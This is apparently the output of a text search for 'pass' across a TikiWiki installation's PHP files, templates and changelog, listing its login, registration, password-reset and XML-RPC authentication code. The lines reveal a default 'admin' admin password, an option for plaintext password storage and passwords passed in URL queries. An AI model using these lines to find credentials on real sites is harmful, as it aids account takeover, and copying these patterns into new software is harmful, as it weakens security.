/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("useRegisterPasscode", 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('useRegisterPasscode', 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("useRegisterPasscode", 'n');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('useRegisterPasscode', 'n');
/var/www/tikiwiki/tiki-admin_include_login.php:    $tikilib->set_preference("registerPasscode", $_REQUEST["registerPasscode"]);
/var/www/tikiwiki/tiki-admin_include_login.php:    $smarty->assign('registerPasscode', $_REQUEST["registerPasscode"]);
/var/www/tikiwiki/tiki-admin_include_login.php:    $tikilib->set_preference("min_pass_length", $_REQUEST["min_pass_length"]);
/var/www/tikiwiki/tiki-admin_include_login.php:    $smarty->assign('min_pass_length', $_REQUEST["min_pass_length"]);
/var/www/tikiwiki/tiki-admin_include_login.php:    $tikilib->set_preference("pass_due", $_REQUEST["pass_due"]);
/var/www/tikiwiki/tiki-admin_include_login.php:    $smarty->assign('pass_due', $_REQUEST["pass_due"]);
/var/www/tikiwiki/tiki-admin_include_login.php:    if (isset($_REQUEST["pass_chr_num"]) && $_REQUEST["pass_chr_num"] == "on") {
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("pass_chr_num", 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('pass_chr_num', 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("pass_chr_num", 'n');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('pass_chr_num', 'n');
/var/www/tikiwiki/tiki-admin_include_login.php:    if (isset($_REQUEST["feature_clear_passwords"]) && $_REQUEST["feature_clear_passwords"] == "on") {
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("feature_clear_passwords", 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('feature_clear_passwords', 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("feature_clear_passwords", 'n');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('feature_clear_passwords', 'n');
/var/www/tikiwiki/tiki-admin_include_login.php:    if (isset($_REQUEST["forgotPass"]) && $_REQUEST["forgotPass"] == "on") {
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("forgotPass", 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('forgotPass', 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("forgotPass", 'n');
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('forgotPass', 'n');
/var/www/tikiwiki/tiki-admin_include_login.php:    if (isset($_REQUEST["auth_ldap_adminpass"])) {
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("auth_ldap_adminpass", $_REQUEST["auth_ldap_adminpass"]);
/var/www/tikiwiki/tiki-admin_include_login.php: $smarty->assign('auth_ldap_adminpass', $_REQUEST["auth_ldap_adminpass"]);
/var/www/tikiwiki/tiki-admin_include_login.php:$smarty->assign("change_password", $tikilib->get_preference("change_password", "y"));
/var/www/tikiwiki/tiki-admin_include_login.php:$smarty->assign("useRegisterPasscode", $tikilib->get_preference("useRegisterPasscode", 'n'));
/var/www/tikiwiki/tiki-admin_include_login.php:$smarty->assign("registerPasscode", $tikilib->get_preference("registerPasscode", ''));
/var/www/tikiwiki/tiki-admin_include_login.php:$smarty->assign("forgotPass", $tikilib->get_preference("forgotPass", 'n'));
/var/www/tikiwiki/remote.php:   $pass = $params->getParam(2); $pass = $pass->scalarval(); 
/var/www/tikiwiki/remote.php:   if(!$userlib->validate_user($login,$pass,'','')) {
/var/www/tikiwiki/remote.php:           $msg = tra('Invalid username or password');
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:       document.loginbox.pass.value +
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:       document.loginbox.pass.value=\'\';
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:       document.login.password.value = "";
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:          <tr><td class="module"><label for="login-pass">pass:</label></td></tr>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:          <tr><td><input type="password" name="pass" id="login-pass" size="20" /></td></tr>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:          <?php if ($this->_tpl_vars['forgotPass'] == 'y' && $this->_tpl_vars['allowRegister'] == 'y' && $this->_tpl_vars['change_password'] == 'y'): ?>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:            <td  class="module" valign="bottom">[ <a class="linkmodule" href="tiki-register.php" title="Click here to register">register</a> | <a class="linkmodule" href="tiki-remind_password.php" title="Click here if you've forgotten your password">I forgot my password</a> ]</td>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:          <?php if ($this->_tpl_vars['forgotPass'] == 'y' && $this->_tpl_vars['allowRegister'] != 'y' && $this->_tpl_vars['change_password'] == 'y'): ?>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:            <td  class="module" valign="bottom"><a class="linkmodule" href="tiki-remind_password.php" title="Click here if you've forgotten your password">I forgot my password</a></td>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:          <?php if (( $this->_tpl_vars['forgotPass'] != 'y' || $this->_tpl_vars['change_password'] != 'y' ) && $this->_tpl_vars['allowRegister'] == 'y'): ?>
/var/www/tikiwiki/templates_c/en/%%9E/9E2/9E21ED1B%%mod-login_box.tpl.php:          <?php if (( $this->_tpl_vars['forgotPass'] != 'y' || $this->_tpl_vars['change_password'] != 'y' ) && $this->_tpl_vars['allowRegister'] != 'y'): ?>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:         compiled from tiki-change_password.tpl */ ?>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:smarty_core_load_plugins(array('plugins' => array(array('modifier', 'escape', 'tiki-change_password.tpl', 6, false),)), $this); ?>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:<h1>Change password enforced</h1>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:<form method="post" action="tiki-change_password.php" >
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:  <td class="formcolor">Old password:</td>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:  <td class="formcolor"><input type="password" name="oldpass" value="<?php echo ((is_array($_tmp=$this->_tpl_vars['oldpass'])) ? $this->_run_mod_handler('escape', true, $_tmp) : smarty_modifier_escape($_tmp)); ?>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:  <td class="formcolor">New password:</td>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:  <td class="formcolor"><input type="password" name="pass" /></td>
/var/www/tikiwiki/templates_c/en/%%84/842/842355E4%%tiki-change_password.tpl.php:  <td class="formcolor"><input type="password" name="pass2" /></td>
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:<td>Password:</td>
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:<input type="password" name="pass" />
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:Database password
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:                   Please enter your admin password to continue<br /><br />
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:          <tr><td class="module"><?php $this->_tag_stack[] = array('tr', array()); $_block_repeat=true;smarty_block_tr($this->_tag_stack[count($this->_tag_stack)-1][1], null, $this, $_block_repeat);while ($_block_repeat) { ob_start(); ?>pass<?php $_block_content = ob_get_contents(); ob_end_clean(); $_block_repeat=false;echo smarty_block_tr($this->_tag_stack[count($this->_tag_stack)-1][1], $_block_content, $this, $_block_repeat); }  array_pop($this->_tag_stack); ?>:</td></tr>
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:          <tr><td><input type="password" name="pass" size="20" /></td></tr>
/var/www/tikiwiki/templates_c/en^%%6C^6C2^6C25FA1F%%tiki-install.tpl.php:               this is your first install your admin password is 'admin'. You can
/var/www/tikiwiki/tiki-user_watches.php:/* CSRL doesn't work if param as passed not in the uri */
/var/www/tikiwiki/tiki-webmail_download_attachment.php://$pop3 = new POP3($current["pop"], $current["username"], $current["pass"]);
/var/www/tikiwiki/tiki-webmail_download_attachment.php:$pop3->login($current["username"], $current["pass"]);
/var/www/tikiwiki/doc/htaccess:#AuthName EnterPassword
/var/www/tikiwiki/tiki-newsreader_read.php:     || (!isset($_REQUEST['username'])) || (!isset($_REQUEST['password'])) || (!isset($_REQUEST['group']))) {
/var/www/tikiwiki/tiki-newsreader_read.php:     $smarty->assign('msg', tra("Missing information to read news (server,port,username,password,group) required"));
/var/www/tikiwiki/tiki-newsreader_read.php:$smarty->assign('password', $_REQUEST['password']);
/var/www/tikiwiki/tiki-newsreader_read.php:if (!$newslib->news_set_server($_REQUEST['server'], $_REQUEST['port'], $_REQUEST['username'], $_REQUEST['password'])) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(2);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     if ($userlib->validate_user($username, $password, '', '')) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:             return new XML_RPC_Response(0, 101, "Invalid username or password");
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(3);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passp = $params->getParam(4);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $content = $passp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passp = $params->getParam(5);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $publish = $passp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     if (!$userlib->validate_user($username, $password, '', '')) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:             return new XML_RPC_Response(0, 101, "Invalid username or password");
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(3);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passp = $params->getParam(4);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $content = $passp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passp = $params->getParam(5);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $publish = $passp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     if (!$userlib->validate_user($username, $password, '', '')) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:             return new XML_RPC_Response(0, 101, "Invalid username or password");
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(3);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passp = $params->getParam(4);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $publish = $passp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     if (!$userlib->validate_user($username, $password, '', '')) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:             return new XML_RPC_Response(0, 101, "Invalid username or password");
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(3);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     if (!$userlib->validate_user($username, $password, '', '')) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:             return new XML_RPC_Response(0, 101, "Invalid username or password");
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(3);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passp = $params->getParam(4);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $number = $passp->scalarval();
/var/www/tikiwiki/tiki-xmlrpc_services.php:     if (!$userlib->validate_user($username, $password, '', '')) {
/var/www/tikiwiki/tiki-xmlrpc_services.php:             return new XML_RPC_Response(0, 101, "Invalid username or password");
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $passwordp = $params->getParam(2);
/var/www/tikiwiki/tiki-xmlrpc_services.php:     $password = $passwordp->scalarval();
/var/www/tikiwiki/tiki-setup_base.php:ini_set('allow_call_time_pass_reference','On');
/var/www/tikiwiki/tiki-setup_base.php:$vartype['actpass'] = 'string'; // remind password page
/var/www/tikiwiki/tiki-setup_base.php:$vartype['user'] = 'string'; // remind password page
/var/www/tikiwiki/tiki-setup_base.php:$vartype['remind'] = 'string'; // remind password page
/var/www/tikiwiki/tiki-setup_base.php:  $ADODB_SESSION_PWD=$pass_tiki;
/var/www/tikiwiki/tiki-setup_base.php:  unset($pass_tiki);
/var/www/tikiwiki/tiki-setup_base.php:  // if everything failed, check for user+pass params in the URL
/var/www/tikiwiki/tiki-setup_base.php:  // GET (username and password in URL). That is some kind of insecure, because
/var/www/tikiwiki/tiki-setup_base.php:  // password and username are not encrypted and visible and browser caches etc, besides
/var/www/tikiwiki/tiki-setup_base.php:  //      if (isset($_REQUEST["user"]) && isset($_REQUEST["pass"])) {
/var/www/tikiwiki/tiki-setup_base.php:  //              $isvalid = $userlib->validate_user($_REQUEST["user"], $_REQUEST["pass"], '', '');
/var/www/tikiwiki/tiki-setup_base.php:  //                      // Now since the user is valid we put the user provpassword as the password 
/var/www/tikiwiki/tiki-backup.php:      $filename = md5($tikilib->genPass()). '.sql';
/var/www/tikiwiki/changelog.txt:[FIX] devtools: improved sqlupgrade script for when password includes a quote 
/var/www/tikiwiki/changelog.txt:[FIX] remind password message: fix url - sylvie
/var/www/tikiwiki/changelog.txt:[FIX] Return and passing by reference for PHP4.4.0 and PHP5 - mose amette
/var/www/tikiwiki/changelog.txt:user-name, that the user has to change his password - sylvie
/var/www/tikiwiki/changelog.txt:[FIX] Don't show cleartext password in newsreader, show asterisks - amette
/var/www/tikiwiki/changelog.txt:[FIX] password reminder mail fix - wog, damian
/var/www/tikiwiki/changelog.txt:* [FIX] admin : disallow blank admin password
/var/www/tikiwiki/changelog.txt:* [FIX] admin users : fixed error when char+numbers enforced in password
/var/www/tikiwiki/changelog.txt:* [FIX] login : Make password resets more user-friendly (but untranslated in
/var/www/tikiwiki/changelog.txt:* [FIX] password reset : more userfriendly
/var/www/tikiwiki/changelog.txt:* [NEW] password reset: users must click email link to confirm
/var/www/tikiwiki/changelog.txt:* [NEW] change_password new perm
/var/www/tikiwiki/changelog.txt:* [MOD] trackers : header, to display passive field with a subtitle in forms
/var/www/tikiwiki/changelog.txt:* [FIX] Remove the old password from being displayed on the tiki-change_password
/var/www/tikiwiki/changelog.txt:* [FIX] individual wiki page permissions could be bypassed
/var/www/tikiwiki/changelog.txt:   Pear::Auth (LDAP) and no passwords are in Tiki DB
/var/www/tikiwiki/changelog.txt:* [FIX] allow user to confirm his email and bypass validation in case the mail
/var/www/tikiwiki/changelog.txt:* [FIX] fixed bug where tiki-install.php rejected all admin passwords,
/var/www/tikiwiki/changelog.txt:* [FIX] fixed bug where tiki stores clear text passwords by default
/var/www/tikiwiki/changelog.txt:* [FIX] Password matching on letters and numbers now works
/var/www/tikiwiki/changelog.txt:* [FIX] user hash generated from password only, now uses login and email too
/var/www/tikiwiki/changelog.txt:   Login, password and mail are forced. If an unexistant field is specified,
/var/www/tikiwiki/changelog.txt:   the user password.
/var/www/tikiwiki/changelog.txt:* [NEW] Admin can choose if passwords are stored in plaintext or not. If not, a
/var/www/tikiwiki/changelog.txt:   hash will be used to authenticate users and the remind-password feature will
/var/www/tikiwiki/changelog.txt:   generate a new password and send it by email. The new password will be
/var/www/tikiwiki/changelog.txt:* [NEW] Admin can select the minimum length for a password to be valid
/var/www/tikiwiki/changelog.txt:* [NEW] Admin can choose if user passwords must include letters and numbers to
/var/www/tikiwiki/changelog.txt:* [NEW] Admin can setup passwords lifetime and Tiki will force the user to
/var/www/tikiwiki/changelog.txt:   change his password once the password is expired.
/var/www/tikiwiki/changelog.txt:   support Javascript then user passwords are never send across the network
/var/www/tikiwiki/changelog.txt:   improves security since the chance of password eavesdropping is reduced a
/var/www/tikiwiki/changelog.txt:* [NEW] Optionally you can make the user enter a special passcode to let him
/var/www/tikiwiki/changelog.txt:* [NEW] A tool to autogenerate passwords was added in the resgistration screen
/var/www/tikiwiki/changelog.txt:   once activated the user will login normally with his password. Of course this
/var/www/tikiwiki/changelog.txt:* [NEW] Optinally Tiki can display a "I forgot my password link" for
/var/www/tikiwiki/changelog.txt:   unregistered users to allow users that have forgotten their password to get
/var/www/tikiwiki/tiki-newsreader_groups.php:if (!$newslib->news_set_server($info['server'], $info['port'], $info['username'], $info['password'])) {
/var/www/tikiwiki/tiki-edit_article.php:// If the articleId is passed then get the article data
/var/www/tikiwiki/tiki-login.php:$bypass_siteclose_check = 'y';
/var/www/tikiwiki/tiki-login.php:$pass = isset($_REQUEST['pass']) ? $_REQUEST['pass'] : false;
/var/www/tikiwiki/tiki-login.php:if ($feature_intertiki == 'y' and isset($_REQUEST['intertiki']) and in_array($_REQUEST['intertiki'],array_keys($interlist)) and $user and $pass) {
/var/www/tikiwiki/tiki-login.php:    function intervalidate($remote,$user,$pass,$get_info = false) {
/var/www/tikiwiki/tiki-login.php:                                        new XML_RPC_Value($pass, 'string'),
/var/www/tikiwiki/tiki-login.php:    $rpcauth = intervalidate($interlist[$_REQUEST['intertiki']],$user,$pass,!empty($feature_intertiki_mymaster)? true : false);
/var/www/tikiwiki/tiki-login.php:$isvalid = $userlib->validate_user($user, $pass, $challenge, $response);
/var/www/tikiwiki/tiki-login.php:// If the password is valid but it is due then force the user to change the password by
/var/www/tikiwiki/tiki-login.php:// sending the user to the new password change screen without letting him use tiki
/var/www/tikiwiki/tiki-login.php:// The user must re-nter the old password so no security risk here
/var/www/tikiwiki/tiki-login.php:               // Redirect the user to the screen where he must change his password.
/var/www/tikiwiki/tiki-login.php:               // Note that the user is not logged in he's just validated to change his password
/var/www/tikiwiki/tiki-login.php:               // The user must re-enter his old password so no security risk involved
/var/www/tikiwiki/tiki-login.php:               $url = 'tiki-change_password.php?user=' . urlencode($user). '&oldpass=' . urlencode($pass);
/var/www/tikiwiki/tiki-login.php:               // User is valid and not due to change pass.. start session
/var/www/tikiwiki/tiki-login.php:       $url = 'tiki-error.php?error=' . urlencode(tra('Invalid username or password'));
/var/www/tikiwiki/tiki-mailin-code.php:  //$pop3 = new POP3($acc["pop"], $acc["username"], $acc["pass"]);
/var/www/tikiwiki/tiki-mailin-code.php: $pop3->login($acc["username"], $acc["pass"]);
/var/www/tikiwiki/tiki-mailin-code.php:      $mail->setSMTPParams($acc["smtp"], $acc["smtpPort"], '', $acc["useAuth"], $acc["username"], $acc["pass"]);
/var/www/tikiwiki/tiki-mailin-code.php:        $mail->setSMTPParams($acc["smtp"], $acc["smtpPort"], '', $acc["useAuth"], $acc["username"], $acc["pass"]);
/var/www/tikiwiki/tiki-mailin-code.php:          $mail->setSMTPParams($acc["smtp"], $acc["smtpPort"], '', $acc["useAuth"], $acc["username"], $acc["pass"]);
/var/www/tikiwiki/tiki-send_objects.php:if (!isset($_REQUEST["password"])) {
/var/www/tikiwiki/tiki-send_objects.php:        $_REQUEST["password"] = '';
/var/www/tikiwiki/tiki-send_objects.php:$smarty->assign('password', $_REQUEST["password"]);
/var/www/tikiwiki/tiki-send_objects.php:                                new XML_RPC_Value($_REQUEST["password"], "string"),
/var/www/tikiwiki/tiki-send_objects.php:                                new XML_RPC_Value($_REQUEST["password"], "string"),
/var/www/tikiwiki/templates/modules/mod-register.tpl:<input type="hidden" name="pass" value="{$password}"/>
/var/www/tikiwiki/templates/modules/mod-register.tpl:{if $useRegisterPasscode eq 'y'}
/var/www/tikiwiki/templates/modules/mod-register.tpl:<tr><td class="formcolor">{tr}Passcode to register (not your user password){/tr}:</td><td class="formcolor"><input type="password" name="passcode" /></td></tr>
/var/www/tikiwiki/templates/modules/mod-register.tpl:<tr><td class="formcolor">{tr}Password{/tr}:</td><td class="formcolor"><input id='pass1' type="password" name="pass" /></td></tr>
/var/www/tikiwiki/templates/modules/mod-register.tpl:<tr><td class="formcolor">{tr}Repeat password{/tr}:</td><td class="formcolor"><input id='pass2' type="password" name="passAgain" /></td></tr>
/var/www/tikiwiki/templates/modules/mod-register.tpl:<tr><td class="formcolor"><a class="link" href="javascript:genPass('genepass','pass1','pass2');">{tr}Generate a password{/tr}</a></td>
/var/www/tikiwiki/templates/modules/mod-register.tpl:<td class="formcolor"><input id='genepass' type="text" /></td></tr>
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:       document.loginbox.pass.value +
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:       document.loginbox.pass.value='';
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:       document.login.password.value = "";
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:          <tr><td class="module"><label for="login-pass">{tr}pass{/tr}:</label></td></tr>
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:          <tr><td><input type="password" name="pass" id="login-pass" size="20" /></td></tr>
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:          {if $forgotPass eq 'y' and $allowRegister eq 'y' and $change_password eq 'y'}
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:            <td  class="module" valign="bottom">[ <a class="linkmodule" href="tiki-register.php" title="{tr}Click here to register{/tr}">{tr}register{/tr}</a> | <a class="linkmodule" href="tiki-remind_password.php" title="{tr}Click here if you've forgotten your password{/tr}">{tr}I forgot my pass{/tr}</a> ]</td>
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:          {if $forgotPass eq 'y' and $allowRegister ne 'y' and $change_password eq 'y'}
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:            <td  class="module" valign="bottom"><a class="linkmodule" href="tiki-remind_password.php" title="{tr}Click here if you've forgotten your password{/tr}">{tr}I forgot my pass{/tr}</a></td>
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:          {if ($forgotPass ne 'y' or $change_password ne 'y') and $allowRegister eq 'y'}
/var/www/tikiwiki/templates/modules/mod-login_box.tpl:          {if ($forgotPass ne 'y' or $change_password ne 'y')and $allowRegister ne 'y'}
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:       document.loginbox.zoofoo.value=MD5(document.loginbox.pass.value);
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:       MD5(document.loginbox.pass.value) +
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:       document.loginbox.pass.value='';
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:       document.login.password.value = "";
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:          <div class="module"><input type="password" name="pass" size="8" /> {tr}pass{/tr}</div>
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:          {if $allowRegister eq 'y' and $forgotPass eq 'y'}
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:                                               <div class="module"><a class="linkmodule" href="tiki-remind_password.php">{tr}I forgot my pass{/tr}</a></div>
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:          {if $forgotPass eq 'y' and $allowRegister ne 'y'}
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:            <div class="module"><a class="linkmodule" href="tiki-remind_password.php">{tr}I forgot my pass{/tr}</a></div>
/var/www/tikiwiki/templates/styles/geo/modules/mod-login_box.tpl:          {if $forgotPass ne 'y' and $allowRegister eq 'y'}
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:<input type="hidden" name="pass" value="{$password}"/>
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:{if $useRegisterPasscode eq 'y'}
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:<tr><td class="formcolor">{tr}Passcode to register (not your user password){/tr}:</td><td class="formcolor"><input type="password" name="passcode" /></td></tr>
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:<tr><td class="formcolor">{tr}Password{/tr}:</td><td class="formcolor"><input id='pass1' type="password" name="pass" /></td></tr>
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:<tr><td class="formcolor">{tr}Repeat password{/tr}:</td><td class="formcolor"><input id='pass2' type="password" name="passAgain" /></td></tr>
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:<tr><td class="formcolor"><a class="link" href="javascript:genPass('genepass','pass1','pass2');">{tr}Generate a password{/tr}</a></td>
/var/www/tikiwiki/templates/styles/simple/modules/mod-register.tpl:<td class="formcolor"><input id='genepass' type="text" /></td></tr>
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:                    document.loginbox.pass.value +
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:                    document.loginbox.pass.value='';
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:    <div class="module"><label for="login-pass">{tr}pass{/tr}:</label>
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:    <input type="password" name="pass" id="login-pass" size="20" /></div>
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:            {if $forgotPass eq 'y' and $allowRegister ne 'y' and $change_password eq 'y'}
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:    <div class="module"><a class="linkmodule" href="tiki-remind_password.php" title="{tr}Click here if you've forgotten your password{/tr}"><em>{tr}I forgot my pass{/tr}</em></a></div>
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:            {if ($forgotPass ne 'y' or $change_password ne 'y') and $allowRegister eq 'y'}
/var/www/tikiwiki/templates/styles/simple/modules/mod-login_box.tpl:                    <li><a class="linkmodule" href="tiki-remind_password.php" title="{tr}Click here if you've forgotten your password{/tr}">{tr}I forgot my pass{/tr}</a></li>
/var/www/tikiwiki/templates/styles/mose/tiki-top_bar.tpl:<input type="password" name="pass" id="login-pass" size="12" />
/var/www/tikiwiki/templates/mail/user_validation_mail.tpl:{$mail_machine}?user={$mail_user|escape:'url'}&pass={$mail_apass}
/var/www/tikiwiki/templates/mail/moderate_activation_mail.tpl:{tr}To login with your username and password, please follow this link:{/tr}
/var/www/tikiwiki/templates/mail/moderate_validation_mail.tpl:{$mail_machine}?user={$mail_user|escape:'url'}&pass={$mail_apass}
/var/www/tikiwiki/templates/mail/password_reminder.tpl:{tr}Someone coming from IP Address{/tr} {$mail_ip} {if $clearpw eq 'y'}{tr}requested a reminder of the password for your account{/tr}{else}{tr}requested password reset for your account{/tr} {/if} ({$mail_site}).
/var/www/tikiwiki/templates/mail/password_reminder.tpl:{tr}Since this is your registered email address we inform that the password for this account is{/tr} {$mail_pass}
/var/www/tikiwiki/templates/mail/password_reminder.tpl:{tr}Please click on the following link to confirm you wish to reset your password and go to the screen where you must enter a new "permanent" password. Please pick a password only you will know, and don't share it with anyone else.
/var/www/tikiwiki/templates/mail/password_reminder.tpl:{$mail_machine}/tiki-remind_password.php?user={$mail_user|escape:'url'}&actpass={$mail_apass}
/var/www/tikiwiki/templates/mail/password_reminder.tpl:{tr}Important: Username & password are CaSe SenSitiVe{/tr}
/var/www/tikiwiki/templates/mail/password_reminder.tpl:{tr}Important: The old password remains active if you don't click the link above.{/tr}
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}Request passcode to register{/tr}:</td><td><input type="checkbox" name="useRegisterPasscode" {if $useRegisterPasscode eq 'y'}checked="checked"{/if}/><input type="text" name="registerPasscode" value="{$registerPasscode|escape}"/></td></tr>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}Remind passwords by email (if "Store plaintext passwords" is activated.) Else, Reset passwords by email{/tr}:</td><td><input type="checkbox" name="forgotPass" {if $forgotPass ne 'n'}checked="checked"{/if}/></td></tr>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}Store plaintext passwords{/tr}:</td><td><input type="checkbox" name="feature_clear_passwords" {if $feature_clear_passwords eq 'y'}checked="checked"{/if}/></td></tr>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:  <td class="form">{tr}Reg users can change password{/tr}:</td>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:  <td><input type="checkbox" name="change_password" {if $change_password eq 'y'}checked="checked"{/if}/></td>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}Force to use chars and nums in passwords{/tr}:</td><td><input type="checkbox" name="pass_chr_num" {if $pass_chr_num eq 'y'}checked="checked"{/if}/></td></tr>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}Minimum password length{/tr}:</td><td><input type="text" name="min_pass_length" value="{$min_pass_length|escape}" /></td></tr>
